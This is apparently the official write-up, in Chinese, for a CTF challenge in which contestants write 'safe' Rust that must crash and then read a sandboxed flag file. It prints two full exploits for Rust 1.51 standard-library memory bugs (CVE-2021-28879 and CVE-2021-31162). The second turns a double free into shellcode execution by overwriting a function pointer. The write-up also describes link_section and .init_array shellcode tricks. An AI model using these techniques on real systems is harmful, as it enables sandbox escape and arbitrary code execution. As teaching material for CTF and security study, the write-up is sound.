# [Binary] 编原译理习题课 · 实验班

- 命题人：lrh2000（题面：某学院的学生）
- Flag 1：200 分
- Flag 2：500 分

## 题目描述

<blockquote>
<p>某学院的学生走进一家酒吧，发现酒吧每两个小时才营业一次，需要事先预定。</p>
<p>某学院的学生走进一家酒吧，发现很多人并没有事先预定，把吧台占满了。</p>
<p>某学院的学生走进一家酒吧，发现要扫两次码才能启动点单小程序。</p>
<p>某学院的学生走进一家酒吧，发现保安不让把手机带进去，因为手机是大功率电器。</p>
<p>某学院的学生走进一家酒吧，发现酒吧的暖气响个不停。</p>
<p>某学院的学生走进一家酒吧，发现酒吧包间的隔音很差。</p>
<p>某学院的学生走进一家酒吧，发现天花板上贴的墙纸掉了下来。</p>
<p>某学院的学生走进一家酒吧，发现酒吧门口施工把电线挖断了。</p>
<p>某学院的学生走进一家酒吧，发现酒吧门口施工把水管也挖断了。</p>
<p>某学院的学生走进一家酒吧，发现酒吧突然开始消防演习，烟雾熏了一脸。</p>
<p>某学院的学生走进一家酒吧，发现酒吧无线网的 IPv6 无法正常工作。</p>
<p>某学院的学生走进一家酒吧，发现收银台在施工，结账需要绕到后厨。</p>
<p>某学院的学生走进一家酒吧，发现老板娘在的日子就不供应鸡尾酒。</p>
<p>某学院的学生走进一家酒吧，发现点的饮品需要自己在 7 点前去门口领取。</p>
<p>某学院的学生走进一家酒吧，发现进入酒吧的顾客如果不每天做核酸就会被老板电话轰炸。</p>
<p>这个学生很生气，模仿一位测试工程师在酒吧里编译他的代码，想要炸掉酒吧。</p>
<p>可惜他学习的编程语言是 Rust，怎么也不炸。他愤怒地大叫 “你不要咄咄逼人！”</p>
<p>酒吧炸了。但他的编译器仍然完好无损。</p>
</blockquote>
<p>请提交一段 Safe Rust 代码，<strong>让程序出现段错误</strong>可以获得 Flag 1，<strong>读取打开的 /flag2 文件</strong>获得 Flag 2。</p>
<div class="well">
<p><strong>第二阶段提示：</strong></p>
<p>以下两个提示二选一即可：</p>
<ul>
<li><a target="_blank" rel="noopener noreferrer" href="https://github.com/Qwaz/rust-cve">Rust CVEs 合集</a></li>
<li><a target="_blank" rel="noopener noreferrer" href="https://doc.rust-lang.org/reference/abi.html#the-link_section-attribute">link_section 属性</a></li>
</ul>
</div>

**【终端交互：连接到题目】**

**[【附件：下载题目源码（prob13-src.zip）】](attachment/prob13-src.zip)**

## 预期解法

预期考察点是有问题的unsafe代码（即Rust标准库中的CVE）可以被safe代码利用。

题目公开的源代码，可以从Dockerfile中看到了使用的Rust版本是1.51，谷歌搜索Rust CVE即可找到[相关合集](https://github.com/Qwaz/rust-cve)，并且Rust 1.51有两个严重的内存安全漏洞，分别是[缓冲区溢出（CVE-2021-28879）](https://github.com/rust-lang/rust/issues/82282)和[内存重复释放（CVE-2021-31162）](https://github.com/rust-lang/rust/issues/83618)。

注意到这两个漏洞都附上了PoC，[第一个漏洞的PoC](https://play.rust-lang.org/?version=stable&mode=release&edition=2018&gist=0e6f0c70e6aaaba62610f19fd9186756)可以使得程序段错误，[第二个漏洞的PoC](https://play.rust-lang.org/?version=stable&mode=debug&edition=2018&gist=9ee0a0b525970bc4ea2dc87e35aeda3a)可以触发libc的`free(): double free detected in tcache`以及程序终止（但并不是段错误）。

阅读题面可知获得Flag 1的条件是使得程序出现段错误，因此只要将相应的第一个PoC复制粘贴，修改主函数函数名即可（因而，获得Flag 1并不需要会Rust）：
```rust
#![forbid(unsafe_code)]

fn overflowed_zip(arr: &[i32]) -> impl Iterator<Item = (i32, &())> {
    static UNIT_EMPTY_ARR: [(); 0] = [];

    let mapped = arr.into_iter().map(|i| *i);
    let mut zipped = mapped.zip(UNIT_EMPTY_ARR.iter());
    zipped.next();
    zipped
}

pub fn run() {
    let arr = [1, 2, 3];
    let zip = overflowed_zip(&arr).zip(overflowed_zip(&arr));

    dbg!(zip.size_hint());
    for (index, num) in zip.map(|((num, _), _)| num).enumerate() {
        println!("{}: {}", index, num);
    }
}

//EOF
```

虽然Flag 2只需要打开并读取一个文件，但是阅读源码可知本题通过`seccomp`沙箱限制了系统调用，导致没法办法直接调用Rust库函数打开新的文件，尽管可以在已经打开的文件描述符上直接读取，但这是Rust的safe API不支持的操作。

这部分的预期解是对上面两个CVE中的任意一个进行漏洞利用，例如嵌入shellcode并且篡改函数指针指向该shellcode，这样就可以执行任意代码、调用任意系统调用。缓冲区溢出和内存重复释放都可以破坏Rust类型系统的约束，能较容易地做到这一点（在熟悉Rust语言的前提下），下面的示例代码是基于后者完成的：
```rust
#![forbid(unsafe_code)]

use std::{convert::TryInto, iter::FromIterator, thread};

enum Evil<'a> {
    DoubleFree {
        _victim: Box<[u8; 64]>,
        mem: &'a mut Memory,
    },
    DropPanic(),
}

impl<'a> Drop for Evil<'a> {
    fn drop(&mut self) {
        match self {
            Self::DropPanic() => {
                if !thread::panicking() {
                    panic!();
                }
            }
            Self::DoubleFree { _victim: _, mem } => {
                if thread::panicking() {
                    mem.data = Some(Box::new([0; 64]));
                }
            }
        }
    }
}

struct Memory {
    data: Option<Box<[u8; 64]>>,
}

impl Drop for Memory {
    fn drop(&mut self) {
        match &mut self.data {
            Some(mem) => use_after_free(mem),
            None => (),
        }
    }
}

struct Layout<'a> {
    func: fn(u64, u64, u64, u64) -> u64,
    data: &'a mut [u8; 64],
    _padding: [u64; 6],
}

fn use_after_free(mem: &mut Box<[u8; 64]>) {
    let mut arr = [0; 64];
    let mut layout = Box::new(Layout {
        func: syscall,
        data: &mut arr,
        _padding: [233; 6],
    });

    println!(
        "syscall: 0x{:08x}",
        u64::from_le_bytes(mem[0..8].try_into().unwrap()),
    );

    mem[0] = mem[0].checked_add(1).unwrap();
    exploit(&mut layout);
}

fn exploit(layout: &mut Layout) {
    let syscall = layout.func;
    let buffer = layout.data as *mut _;

    syscall(3, buffer as u64, 64, 0);
    syscall(1, buffer as u64, 64, 1);
}

pub fn run() {
    let mut mem = Memory { data: None };

    let vec = Vec::from_iter(
        vec![
            Evil::DoubleFree {
                _victim: Box::new([0; 64]),
                mem: &mut mem,
            },
            Evil::DropPanic(),
        ]
        .into_iter()
        .take(0),
    );
    println!("len: {}", vec.len());
}

pub fn syscall(_arg0: u64, _arg1: u64, _arg2: u64, _sysnr: u64) -> u64 {
    //    0:   91                      xchg   %eax,%ecx
    //    1:   0f 05                   syscall
    //    3:   c3                      ret
    return 0xc3050f91;
}

//EOF
```

## 被干掉的以及没有被干掉的非预期解们

本题的初始版本没有将编译阶段和程序运行阶段分开，从而使得两个flag文件在程序编译阶段均可见，此时可以通过Rust的内置宏`include_str!("/flagX")`将本题目两个flag直接读出。感谢 @xmcp 在验题阶段发现了这一问题，赛时的最终版本保证了flag文件在编译时均不可见，从而避免了这一非预期解（实际比赛时发现该解法在本题放出几个小时内就被选手们进行了尝试）。

然而本题还是被非预期解打爆了，Rust提供了[`link-section`属性](https://doc.rust-lang.org/reference/abi.html#the-link_section-attribute)，这允许程序将函数放在不可执行节（如`.data`），从而制造段错误；这也允许程序在`.text`节直接嵌入shellcode，并在`.init_array`节创建一个指向该shellcode的变量，这样的程序在主函数开始运行前，libc会首先对`.init_array`进行处理，进而触发嵌入shellcode的执行。具体可参考优秀选手WP（TODO：补充具体链接）。

此外还有选手发现Rust存在[长期悬而未决的不完备性（unsoundness）问题](https://github.com/rust-lang/rust/issues/84591)，通过这类问题也可以在只编写safe Rust代码的前提下通过破坏内存做到任意代码执行。具体细节同样可参考优秀选手WP（TODO：补充具体链接）。
